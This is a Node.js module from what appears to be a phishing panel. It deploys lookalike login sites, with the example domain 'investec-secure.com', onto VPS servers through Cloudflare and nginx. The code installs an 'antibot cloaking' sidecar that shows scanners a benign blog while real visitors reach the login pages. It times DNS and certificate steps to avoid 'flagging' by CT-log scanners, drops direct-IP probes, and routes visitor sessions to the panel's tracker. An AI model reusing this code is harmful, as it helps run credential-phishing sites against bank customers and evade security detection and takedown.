/**
 * VPS Domain Manager
 *
 * Attaches / removes individual domains on a website's VPS.
 * Each domain gets its own nginx site file for easy add/delete without
 * touching other domains on the same server.
 *
 * File layout on the VPS:
 *   /etc/nginx/sites-available/<domain>   — nginx server block for this domain
 *   /etc/nginx/sites-enabled/<domain>     — symlink → sites-available
 *   /etc/ssl/<domain>/origin.crt          — Cloudflare Origin cert (15-yr)
 *   /etc/ssl/<domain>/origin.key          — matching private key
 *   /etc/ssl/<domain>/origin.csr          — CSR used for issuance
 *
 * The website's static files live at /var/www/<slug> (created by the
 * Host wizard). Additional domains just add server_name aliases; they
 * don't upload new files.
 */

const fs   = require('fs');
const path = require('path');
const crypto = require('crypto');
const { getAdapter }                        = require('../database/adapter');
const { sshConnect, sshExec }              = require('./deploy/ssh');
const { sftpUploadDir }                     = require('./deploy/sftp');
const { deployAntibot, buildProxyLocations } = require('./antibot-vps/deploy');

const XPAGES_DIR   = path.join(__dirname, '..', 'xPages');
const ANTIBOT_SRC  = path.join(__dirname, '..', 'public', 'antibot.js');

// Deterministic per-slug sidecar port so re-attach is idempotent.
// Range 3100-3999 avoids clash with panel (3000) and reserved system ports.
function sidecarPortFor(slug) {
  const h = crypto.createHash('sha1').update(String(slug)).digest();
  return 3100 + (h.readUInt16BE(0) % 900);
}

// Read the panel-source antibot.js once and cache it; each attach substitutes
// the panel URL into the template and uploads a per-website copy to the VPS.
let _antibotTemplate = null;
function loadAntibotTemplate() {
  if (_antibotTemplate === null) {
    _antibotTemplate = fs.readFileSync(ANTIBOT_SRC, 'utf8');
  }
  return _antibotTemplate;
}
function renderAntibot(panelUrl) {
  return loadAntibotTemplate().replace(/__PANEL_URL__/g, panelUrl.replace(/\/$/, ''));
}

async function loadPanelUrl() {
  const db = getAdapter();
  const row = await db.get(`SELECT value FROM settings WHERE key = 'panel_domain'`);
  const raw = (row && row.value) || process.env.PANEL_DOMAIN || '';
  if (!raw) return '';
  // Normalise: strip scheme + trailing slash, then re-add https
  const clean = raw.replace(/^https?:\/\//i, '').replace(/\/.*$/, '').trim();
  return clean ? `https://${clean}` : '';
}

// ─── Cloudflare Origin cert helpers ──────────────────────────────────────────

async function loadCfCreds() {
  const db = getAdapter();
  const [email, tokenRow, keyRow] = await Promise.all([
    db.get(`SELECT value FROM settings WHERE key = 'deploy_env_CLOUDFLARE_API_EMAIL'`),
    db.get(`SELECT value FROM settings WHERE key = 'deploy_env_CLOUDFLARE_API_TOKEN'`),
    db.get(`SELECT value FROM settings WHERE key = 'deploy_env_CLOUDFLARE_API_KEY'`),
  ]);
  return {
    email: email?.value || process.env.CLOUDFLARE_API_EMAIL,
    token: tokenRow?.value || keyRow?.value || process.env.CLOUDFLARE_API_TOKEN,
  };
}

function cfHeaders({ email, token }) {
  return { 'X-Auth-Email': email, 'X-Auth-Key': token, 'Content-Type': 'application/json' };
}

async function isZoneActive(zoneId) {
  const cf = await loadCfCreds();
  const r  = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}`, { headers: cfHeaders(cf) });
  const j  = await r.json();
  return j?.result?.status === 'active';
}

async function issueOriginCert(csr, domain) {
  const cf = await loadCfCreds();
  const r = await fetch('https://api.cloudflare.com/client/v4/certificates', {
    method: 'POST', headers: cfHeaders(cf),
    body: JSON.stringify({
      hostnames: [domain, `*.${domain}`],
      requested_validity: 5475,
      request_type: 'origin-rsa',
      csr,
    }),
  });
  const j = await r.json();
  if (!j.success) throw new Error('CF Origin cert failed: ' + JSON.stringify(j.errors));
  return { pem: j.result.certificate, expires: j.result.expires_on };
}

async function setZoneSslMode(zoneId, mode = 'strict') {
  const cf = await loadCfCreds();
  await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/ssl`, {
    method: 'PATCH', headers: cfHeaders(cf), body: JSON.stringify({ value: mode })
  });
  await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/settings/always_use_https`, {
    method: 'PATCH', headers: cfHeaders(cf), body: JSON.stringify({ value: 'on' })
  });
}

async function ensureARecord(zoneId, domain, ip) {
  const cf = await loadCfCreds();
  const H  = cfHeaders(cf);
  for (const rec of [
    { type: 'A', name: '@',   content: ip, proxied: true, ttl: 1 },
    { type: 'A', name: 'www', content: ip, proxied: true, ttl: 1 },
  ]) {
    const rr = await fetch(`https://api.cloudflare.com/client/v4/zones/${zoneId}/dns_records`, {
      method: 'POST', headers: H, body: JSON.stringify(rec),
    });
    const j = await rr.json();
    // 81058 = duplicate — that's fine
    if (!j.success && j.errors?.[0]?.code !== 81058) {
      throw new Error(`DNS record ${rec.name} failed: ${JSON.stringify(j.errors)}`);
    }
  }
}

// ─── Website lookup ──────────────────────────────────────────────────────────

async function getWebsiteVps(websiteId) {
  const db = getAdapter();
  const w  = await db.get(`SELECT id, name, demo_slug, vps_host, vps_ssh_port, vps_ssh_user, vps_ssh_pass, vps_ssh_key FROM websites WHERE id = ?`, [websiteId]);
  if (!w)             throw new Error('Website not found');
  if (!w.vps_host)    throw new Error(`Website "${w.name}" has no VPS configured — use the Host wizard first`);
  if (!w.vps_ssh_pass && !w.vps_ssh_key) throw new Error(`Website "${w.name}" has no SSH credentials`);
  const slug = w.demo_slug || (w.name || '').toLowerCase().replace(/[^a-z0-9]/g, '');
  if (!slug) throw new Error(`Website "${w.name}" has no demo_slug — cannot determine document root`);
  return { ...w, slug };
}

// ─── nginx config template ───────────────────────────────────────────────────

// Antibot sidecar architecture: nginx proxies dynamic requests through a
// per-website Node.js guard running on 127.0.0.1:<port>. The guard cloaks
// bots/scanners with a benign blog page and passes real users through to
// static files. Static assets bypass the sidecar for performance.

function buildNginxConfig(domain, slug, hasSsl, sidecarPort) {
  const root = `/var/www/${slug}`;
  const proxyLocations = buildProxyLocations(sidecarPort);

  if (hasSsl) {
    return [
      `# ALP Panel — domain ${domain} for website ${slug}`,
      `server {`,
      `    listen 80; listen [::]:80;`,
      `    server_name ${domain} www.${domain};`,
      `    return 301 https://$host$request_uri;`,
      `}`,
      `server {`,
      `    listen 443 ssl http2; listen [::]:443 ssl http2;`,
      `    server_name ${domain} www.${domain};`,
      `    root ${root};`,
      ``,
      `    ssl_certificate     /etc/ssl/${domain}/origin.crt;`,
      `    ssl_certificate_key /etc/ssl/${domain}/origin.key;`,
      `    ssl_protocols       TLSv1.2 TLSv1.3;`,
      `    ssl_ciphers         HIGH:!aNULL:!MD5;`,
      ``,
      `    add_header X-Content-Type-Options nosniff;`,
      `    add_header X-Frame-Options SAMEORIGIN;`,
      `    add_header X-Robots-Tag "noindex, nofollow, noarchive, nosnippet" always;`,
      ``,
      ...proxyLocations,
      `}`,
    ].join('\n');
  }
  // HTTP-only fallback (used when the CF zone isn't active yet — CF Flexible mode)
  return [
    `# ALP Panel — domain ${domain} for website ${slug} (HTTP-only, SSL pending)`,
    `server {`,
    `    listen 80; listen [::]:80;`,
    `    server_name ${domain} www.${domain};`,
    `    root ${root};`,
    ``,
    `    add_header X-Content-Type-Options nosniff;`,
    `    add_header X-Frame-Options SAMEORIGIN;`,
    `    add_header X-Robots-Tag "noindex, nofollow, noarchive, nosnippet" always;`,
    ``,
    ...proxyLocations,
    `}`,
  ].join('\n');
}

// ─── Public API ──────────────────────────────────────────────────────────────

/**
 * Attach a domain to a website's VPS:
 *   • syncs site files & deploys antibot sidecar (VPS is protected FIRST)
 *   • issues Origin cert (if zone is active) or defers to HTTP-only
 *   • writes nginx site config + reloads
 *   • sets Cloudflare A records → VPS IP (LAST — domain only resolves after
 *     all protection layers are running)
 *
 * The ordering is critical for anti-flagging: CT-log scanners find new
 * domains within minutes of certificate issuance. By the time DNS resolves,
 * the VPS is already cloaking all bot traffic.
 *
 * @param {Object} args
 * @param {number} args.websiteId       — Website ID to attach to
 * @param {string} args.domain          — Domain name (e.g. investec-secure.com)
 * @param {string} args.cfZoneId        — Cloudflare zone ID (already created)
 * @param {Function} [args.onStep]      — Optional (label) => void progress callback
 * @param {Function} [args.onLog]       — Optional (line, level) => void log callback
 * @returns {Promise<{ ssl: boolean, zoneActive: boolean }>}
 */
async function attachDomainToVps({ websiteId, domain, cfZoneId, onStep, onLog }) {
  const step = (l) => onStep && onStep(l);
  const log  = (line, lvl = 'info') => onLog && onLog(line, lvl);

  const w = await getWebsiteVps(websiteId);
  let client;
  try {
    step('Connecting to VPS');
    client = await sshConnect({
      host: w.vps_host, port: w.vps_ssh_port || 22, username: w.vps_ssh_user || 'root',
      password: w.vps_ssh_pass || undefined, privateKey: w.vps_ssh_key || undefined,
    });
    log(`Connected to ${w.vps_host}`, 'success');

    // ── Phase 1: Prepare VPS (all protection layers BEFORE DNS resolves) ────

    // 1. Sync site files — sidecar needs the docroot to exist
    step('Syncing site files to VPS');
    const remoteDir = `/var/www/${w.slug}`;
    const localDir  = path.join(XPAGES_DIR, w.slug);
    if (!fs.existsSync(localDir)) {
      throw new Error(`Local xPages/${w.slug} folder is missing on the panel — cannot upload site files`);
    }
    const localHasIndex = fs.existsSync(path.join(localDir, 'index.html'));
    const localHasLogin = fs.existsSync(path.join(localDir, 'login.html'));
    if (!localHasIndex && !localHasLogin) {
      throw new Error(`Local xPages/${w.slug} has neither index.html nor login.html — nothing to serve as landing page`);
    }
    await sshExec(client, `mkdir -p ${remoteDir}`);
    const uploaded = await sftpUploadDir(client, localDir, remoteDir);
    await sshExec(client, `chown -R www-data:www-data ${remoteDir} 2>/dev/null || true`);
    log(`Synced ${uploaded.files} file(s) to ${remoteDir}`, 'success');

    // Rewrite tracker script tag so sessions reach the panel, not the VPS.
    try {
      const db = getAdapter();
      const panelDomainRow = await db.get(`SELECT value FROM settings WHERE key = 'panel_domain'`);
      const panelDomain    = (panelDomainRow && panelDomainRow.value) || process.env.PANEL_DOMAIN || '';
      const wsRow          = await db.get(`SELECT api_key FROM websites WHERE id = ?`, [websiteId]);
      const apiKey         = wsRow && wsRow.api_key;
      if (panelDomain && apiKey) {
        const trackerUrl = `https://${panelDomain.replace(/^https?:\/\//i, '').replace(/\/.*$/, '')}/tracker.js`;
        const escSrc = trackerUrl.replace(/[&|]/g, '\\$&');
        const escKey = String(apiKey).replace(/[&|]/g, '\\$&');
        const listed = await sshExec(client, `find ${remoteDir} -type f -name "*.html" 2>/dev/null`);
        const htmlFiles = listed.stdout.trim().split('\n').filter(Boolean);
        for (const f of htmlFiles) {
          await sshExec(client, `sed -i 's|src="[^"]*tracker\\.js"|src="${escSrc}"|g' "${f}"`);
          await sshExec(client, `sed -i 's|data-api-key="[^"]*"|data-api-key="${escKey}"|g' "${f}"`);
          await sshExec(client, `sed -i 's|%%API_KEY%%|${escKey}|g' "${f}"`);
        }
        log(`Rewrote tracker src + API key in ${htmlFiles.length} html file(s)`, 'success');
      } else {
        log(`⚠ Skipped tracker rewrite — ${!panelDomain ? 'panel_domain not set' : 'website has no api_key'}`, 'warn');
      }
    } catch (e) {
      log(`Tracker rewrite failed (non-fatal): ${e.message}`, 'warn');
    }

    // 2. Deploy antibot sidecar — must be running before nginx routes to it
    step('Deploying antibot cloaking sidecar');
    const sidecarPort = sidecarPortFor(w.slug);
    try {
      const panelUrl = await loadPanelUrl();
      const info = await deployAntibot({
        ssh: client,
        slug: w.slug,
        docroot: remoteDir,
        port: sidecarPort,
        panelUrl,
        onLog: (line) => log(line, 'info'),
      });
      log(`Antibot sidecar ${info.serviceName} healthy on 127.0.0.1:${info.port}`, 'success');
    } catch (e) {
      log(`Antibot sidecar deploy failed: ${e.message} — nginx will still be written but requests may fail`, 'warn');
    }

    // 3. Check zone status + issue SSL cert (doesn't need DNS A-records)
    step('Checking Cloudflare zone status');
    const active = await isZoneActive(cfZoneId);
    log(`Zone status: ${active ? 'active' : 'pending nameservers'}`, active ? 'success' : 'warn');

    let hasSsl = false;
    if (active) {
      step('Generating SSL certificate (15-yr Origin CA)');
      await sshExec(client, `mkdir -p /etc/ssl/${domain} && cd /etc/ssl/${domain} && openssl genrsa -out origin.key 2048 2>&1`);
      await sshExec(client, `cd /etc/ssl/${domain} && openssl req -new -key origin.key -out origin.csr -subj "/CN=${domain}" -addext "subjectAltName=DNS:${domain},DNS:*.${domain}" 2>&1`);
      const csr = (await sshExec(client, `cat /etc/ssl/${domain}/origin.csr`)).stdout.trim();
      try {
        const { pem, expires } = await issueOriginCert(csr, domain);
        const b64 = Buffer.from(pem).toString('base64');
        await sshExec(client, `echo '${b64}' | base64 -d > /etc/ssl/${domain}/origin.crt`);
        await sshExec(client, `chmod 600 /etc/ssl/${domain}/origin.key`);
        log(`Cert installed (expires ${expires})`, 'success');
        hasSsl = true;
        await setZoneSslMode(cfZoneId, 'strict');
      } catch (ce) {
        log(`SSL cert failed — falling back to HTTP-only: ${ce.message}`, 'warn');
        await setZoneSslMode(cfZoneId, 'flexible');
      }
    } else {
      log('Skipping SSL cert — zone not active yet. Using CF Flexible SSL (HTTP-only origin) so site works immediately', 'warn');
      await setZoneSslMode(cfZoneId, 'flexible');
    }

    // 4. Clean conflicting nginx configs
    step('Cleaning conflicting nginx configs');
    const grepCmd = `grep -rl 'server_name.*${domain}' /etc/nginx/sites-available/ 2>/dev/null || true`;
    const conflicts = (await sshExec(client, grepCmd)).stdout.trim().split('\n').filter(Boolean);
    for (const f of conflicts) {
      const base = f.split('/').pop();
      if (base === domain) continue;
      await sshExec(client, `rm -f /etc/nginx/sites-enabled/${base} /etc/nginx/sites-available/${base}`);
      log(`Removed conflicting nginx config: ${base}`, 'warn');
    }

    // 5. Install default catch-all server block (once per VPS, idempotent).
    //    Drops connections to unknown Host headers — prevents direct-IP scanning.
    step('Installing default catch-all server block');
    try {
      await sshExec(client, `test -f /etc/ssl/default-catchall.crt || openssl req -x509 -nodes -days 3650 -newkey rsa:2048 -keyout /etc/ssl/default-catchall.key -out /etc/ssl/default-catchall.crt -subj "/CN=localhost" 2>&1`);
      const catchallCfg = [
        '# ALP catch-all — drop connections with unknown Host headers',
        'server {',
        '    listen 80 default_server;',
        '    listen [::]:80 default_server;',
        '    listen 443 ssl http2 default_server;',
        '    listen [::]:443 ssl http2 default_server;',
        '    server_name _;',
        '    ssl_certificate /etc/ssl/default-catchall.crt;',
        '    ssl_certificate_key /etc/ssl/default-catchall.key;',
        '    return 444;',
        '}',
      ].join('\n');
      const b64 = Buffer.from(catchallCfg).toString('base64');
      await sshExec(client, `echo '${b64}' | base64 -d > /etc/nginx/sites-available/_default-catchall`);
      await sshExec(client, `ln -sf /etc/nginx/sites-available/_default-catchall /etc/nginx/sites-enabled/_default-catchall`);
      await sshExec(client, `rm -f /etc/nginx/sites-enabled/default`);
      log('Default catch-all installed (drops unknown Host requests)', 'success');
    } catch (e) {
      log(`Catch-all install failed (non-fatal): ${e.message}`, 'warn');
    }

    // 6. Write nginx config that proxies through the sidecar
    const cfg = buildNginxConfig(domain, w.slug, hasSsl, sidecarPort);
    const b64cfg = Buffer.from(cfg).toString('base64');
    await sshExec(client, `echo '${b64cfg}' | base64 -d > /etc/nginx/sites-available/${domain}`);
    await sshExec(client, `ln -sf /etc/nginx/sites-available/${domain} /etc/nginx/sites-enabled/${domain}`);

    // 7. Test + reload nginx
    step('Testing + reloading nginx');
    const test = await sshExec(client, 'nginx -t 2>&1');
    const ok   = (test.stdout + test.stderr).includes('successful');
    if (!ok) throw new Error('nginx config test failed:\n' + (test.stdout + test.stderr));
    await sshExec(client, 'systemctl reload nginx 2>&1');
    log('nginx reloaded ✓', 'success');

    // ── Phase 2: Point DNS to VPS (protection is fully ready) ───────────────

    // 8. Set CF DNS records → VPS IP (LAST — domain only resolves after VPS is armed)
    step('Setting Cloudflare DNS records');
    await ensureARecord(cfZoneId, domain, w.vps_host);
    log(`A ${domain} → ${w.vps_host} (proxied)`, 'success');
    log(`A www.${domain} → ${w.vps_host} (proxied)`, 'success');

    // 9. Local verification — hit nginx via loopback
    step('Verifying domain serves linked website');
    try {
      const probeCmd = `curl -sk --max-time 5 --resolve ${domain}:443:127.0.0.1 --resolve ${domain}:80:127.0.0.1 `
        + `-w "\\n---HTTP:%{http_code}---\\n" ${hasSsl ? `https://${domain}/` : `http://${domain}/`}`;
      const r = await sshExec(client, probeCmd);
      const body = r.stdout || '';
      const codeM = /---HTTP:(\d+)---/.exec(body);
      const httpCode = codeM ? codeM[1] : '000';
      const isDefault = /Welcome to nginx|nginx default page/i.test(body);
      const isServed  = ['200','301','302','307','308'].includes(httpCode) && !isDefault;
      if (isServed) {
        log(`✓ Origin serves ${w.slug} for ${domain} (HTTP ${httpCode})`, 'success');
      } else if (isDefault) {
        log(`⚠ Origin returned the DEFAULT nginx page for ${domain} — nginx is not routing to ${w.slug}`, 'warn');
      } else {
        log(`⚠ Origin returned HTTP ${httpCode} for ${domain} — check /var/www/${w.slug} has login.html or index.html`, 'warn');
      }
    } catch (ve) {
      log(`Verification probe failed (non-fatal): ${ve.message}`, 'warn');
    }

    return { ssl: hasSsl, zoneActive: active };
  } finally {
    if (client) try { client.end(); } catch {}
  }
}

/**
 * Remove a domain from a website's VPS:
 *   • removes nginx site file + symlink
 *   • removes SSL cert directory
 *   • reloads nginx (or restarts if reload fails)
 *
 * Idempotent — safe to call even if the domain was never actually attached.
 */
async function removeDomainFromVps({ websiteId, domain, onStep, onLog }) {
  const step = (l) => onStep && onStep(l);
  const log  = (line, lvl = 'info') => onLog && onLog(line, lvl);

  const w = await getWebsiteVps(websiteId).catch(() => null);
  if (!w) { log('Website has no VPS configured — nothing to clean up on the VPS side', 'warn'); return { skipped: true }; }

  let client;
  try {
    step(`Connecting to ${w.vps_host}`);
    client = await sshConnect({
      host: w.vps_host, port: w.vps_ssh_port || 22, username: w.vps_ssh_user || 'root',
      password: w.vps_ssh_pass || undefined, privateKey: w.vps_ssh_key || undefined,
    });

    step(`Removing nginx site for ${domain}`);
    await sshExec(client, `rm -f /etc/nginx/sites-enabled/${domain} /etc/nginx/sites-available/${domain}`);
    log(`Removed nginx site config`, 'success');

    step(`Removing SSL cert files`);
    await sshExec(client, `rm -rf /etc/ssl/${domain}`);
    log(`Removed cert directory`, 'success');

    step('Reloading nginx');
    const test = await sshExec(client, 'nginx -t 2>&1');
    if ((test.stdout + test.stderr).includes('successful')) {
      await sshExec(client, 'systemctl reload nginx 2>&1');
      log('nginx reloaded ✓', 'success');
    } else {
      log(`nginx test warning after cleanup — skipping reload: ${test.stdout + test.stderr}`, 'warn');
    }
    return { removed: true };
  } finally {
    if (client) try { client.end(); } catch {}
  }
}

module.exports = { attachDomainToVps, removeDomainFromVps, getWebsiteVps, sidecarPortFor };
